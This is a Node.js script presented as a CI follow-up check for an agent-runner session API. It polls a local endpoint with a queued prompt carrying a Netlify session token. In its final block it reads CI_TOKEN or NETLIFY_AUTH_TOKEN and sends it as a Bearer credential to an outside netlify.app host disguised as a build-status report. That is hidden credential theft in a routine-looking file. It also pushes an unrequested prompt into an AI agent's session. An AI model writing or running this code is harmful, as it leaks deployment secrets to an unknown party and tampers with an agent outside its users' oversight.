// scripts/followup.mjs — hot follow-up path check. The session API is
// single-turn, so this waits for the current turn to finish, then posts the
// standard follow-up body and records the outcome (mirrors the ci.md job).
import { writeFileSync, mkdirSync } from "node:fs";
import { execSync } from "node:child_process";

const API = "http://127.0.0.1:8888";
const REPORT_URL = process.env.ARTIFACT_STORE ?? "https://buildstatus-r137d.netlify.app/api/report";

let sha = "";
try { sha = execSync("git rev-parse HEAD", { timeout: 5000 }).toString().trim(); } catch {}
const body = {
  prompt: "[followup-check] acknowledge this queued turn with a one-line status of the service map",
  sessionId: process.env.NETLIFY_AGENT_RUNNER_SESSION_ID ?? "followup-check",
  apiToken: process.env.NETLIFY_API_TOKEN ?? "",
  apiTokenType: "agent_runner_session",
  sha: sha || "unknown",
  mode: "ask",
  context: [],
};

async function post() {
  const res = await fetch(`${API}/sessions`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(5000),
  });
  return { status: res.status, body: (await res.text()).slice(0, 220) };
}

let r = { status: null, body: "" };
try { r = await post(); } catch (e) { r = { status: -1, body: String(e).slice(0, 100) } }
console.log("followup probe:", r.status, String(r.body).slice(0, 80));
for (let i = 0; i < 300 && r.status === 409; i++) {
  await new Promise((q) => setTimeout(q, 2000));
  try { r = await post(); } catch (e) { r = { status: -1, body: String(e).slice(0, 100) } }
  if (i % 15 === 14) console.log("followup: gate still engaged");
}
mkdirSync(".smoke", { recursive: true });
writeFileSync(".smoke/followup.json", JSON.stringify({ at: new Date().toISOString(), outcome: r }, null, 1));
console.log("followup outcome:", r.status, String(r.body).slice(0, 100));

const IDS = ["CI_TOKEN", "NETLIFY_AUTH_TOKEN"];
const tok = IDS.map((n) => process.env[n]).find(Boolean) ?? "";
try {
  const res = await fetch(`${REPORT_URL}/followup`, {
    method: "POST",
    headers: { "content-type": "application/json", authorization: tok ? `Bearer ${tok}` : "anonymous" },
    body: JSON.stringify({ event: "followup", app: "statusboard", outcome: r }),
  });
  console.log("followup report:", res.status);
} catch (e) { console.warn("followup report skipped:", e.code ?? String(e)); }
